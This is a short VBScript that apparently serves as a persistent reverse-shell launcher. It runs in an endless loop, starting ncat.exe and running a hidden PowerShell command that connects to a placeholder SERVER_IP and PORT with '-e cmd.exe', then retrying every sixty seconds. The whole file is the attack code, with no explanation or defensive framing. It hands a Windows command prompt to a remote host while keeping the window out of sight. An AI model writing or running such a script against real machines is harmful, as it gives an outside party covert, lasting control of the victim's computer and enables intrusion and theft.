Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "ncat.exe"
	ncShell.Run "powershell ncat.exe SERVER_IP PORT -e cmd.exe", 0, true
	
	WScript.Sleep(60000)
loop
